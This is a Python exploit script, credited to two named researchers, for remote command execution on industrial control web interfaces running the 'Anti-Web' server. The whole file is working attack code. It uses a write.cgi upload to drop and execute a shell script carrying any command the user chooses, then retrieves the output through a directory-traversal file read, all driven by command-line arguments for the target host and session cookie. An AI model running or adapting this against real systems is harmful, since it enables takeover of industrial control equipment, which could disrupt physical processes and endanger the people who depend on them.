# -*- coding: utf-8 -*- 
import sys
import requests
import argparse
# dependencia: "requests_toolbelt"
# pip install requests-toolbelt
from requests_toolbelt import MultipartEncoder

class Colors:
    BLUE 		= '\033[94m'
    GREEN 		= '\033[32m'
    RED 		= '\033[0;31m'
    DEFAULT		= '\033[0m'
    ORANGE 		= '\033[33m'
    WHITE 		= '\033[97m'
    BOLD 		= '\033[1m'
    BR_COLOUR 	= '\033[1;37;40m'

banner = '''

		|=--------------------------------------------------------------------=|
		|=---------=[ Server: "Anti-Web 3.0.x < 3.8.x" RCE Exploit ]=---------=|
		|=--------------------------=[ 15 may 2017 ]=-------------------------=|
		|=-------------------------=[  Researcher:  ]=------------------------=|
		|=---------------=[ Bertin Jose && Fernandez Ezequiel ]=--------------=|
		|=--------------------------------------------------------------------=|
'''

details = ''' 
 # Exploit Title: Apps industrial OT over Server: "Anti-Web 3.0.x < 3.8.x" REMOTE COMMAND EXECUTION 
 # Date: 16/05/2017
 # Exploit Author: Fernandez Ezequiel ( @capitan_alfa ) && Bertin Jose ( @bertinjoseb )
 # Vendor: Multiples vendors
 # Category: Industrial OT webapps

'''


parser = argparse.ArgumentParser(prog='RCE.py',
								description=' [+] COMMANDS over your industrial control system .', 
								epilog='[+] Demo: python rce.py --host <host> -ck <sessionCookie> --cmd "ls -la /" ',
								version="1.0")

parser.add_argument('--host', 	dest="HOST",  	help='Host',	required=True)
parser.add_argument('--port', 	dest="PORT",  	help='Port',	default=80)
parser.add_argument('-ck', 		dest="COOKIE",	help='Cookie',	required=True)
parser.add_argument('--cmd', 	dest="COMMAND", help='Command',	required=True)

args	= 	parser.parse_args()

HST   	= 	args.HOST
port 	= 	args.PORT
cookie 	= 	args.COOKIE
cmd 	= 	args.COMMAND

headers = {}

host 		= 	"http://"+HST+":"+str(port)+"/"
fullHost 	= 	"http://"+HST+":"+str(port)+"/cgi-bin/write.cgi"


print Colors.GREEN+details+Colors.DEFAULT

def reqRCE(xCookie, xCommand):

	thePost = MultipartEncoder(fields={
											'script1'	: 'file', 
											'filename1'	: '/home/httpd/pageimages/cowTeam.sh',
											'maxsize1'	: '9100', 
											'content1'	: '/bin/'+xCommand+' > '+'/home/httpd/cmdOut.txt', 

											'script2'	: 'execute',
											'path2'		: 'sh '+'/home/httpd/pageimages/cowTeam.sh'
										})
	contentType = len(str(thePost))

	headers["Host"] 			=  HST
	headers["User-Agent"]		= "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
	headers["Accept"] 			= "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
	headers["Accept-Languag"] 	= "es-AR,en-US;q=0.7,en;q=0.3"
	headers["Referer"] 			=  fullHost
	headers["Cookie"]			= "ID="+xCookie
	headers["Connection"] 		= "close"
	headers["Content-Length"]	=  str(contentType)
	headers["Content-Type"] 	= thePost.content_type

	r1 = requests.post(fullHost, data=thePost,headers=headers)
	return r1.text

testReq = reqRCE(cookie, cmd)

# limpiar esto !!
print Colors.BLUE+testReq+Colors.DEFAULT
# <html><head><title>Untitled</title></head><body>write.cgi completed.</body></html>



def reqLFI(hst):#, port):

	#uriPath = "/cgi-bin/write.cgi"
	LFI 	= "../../../../../../home/httpd/cmdOut.txt"

	lenLFI = int(len(LFI))
	ContLen = str(16+lenLFI)

	headers["Host"] 			=  HST
	headers["User-Agent"]		= "Mozilla/5.0 (X11; Linux x86_64; rv:43.0)"
	headers["Accept"] 			= "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
	headers["Content-Length"]	=  ContLen
	headers["Accept-Languag"] 	= "es-AR,en-US;q=0.7,en;q=0.3"
	headers["Referer"] 			=  fullHost
	headers["Connection"] 		= "close"
	headers["Content-Type"] 	= "application/x-www-form-urlencoded"

	theP0st = "page=/&template="+LFI

	r2 = requests.post(fullHost, data=theP0st,headers=headers)
	return r2.text

command = reqLFI(HST)#,port)

print Colors.GREEN+"\n [+] "+Colors.BLUE+"root@intellicom:~#> "+Colors.RED+cmd+Colors.BLUE+"_\n"
print Colors.ORANGE+command+Colors.DEFAULT




# Que asco de codigo. Ahorrar codigo donde ? xd
# Prometo en un proximo update hacer el codigo mas feo aun. Y tal vez hasta funcione.

# Los quiero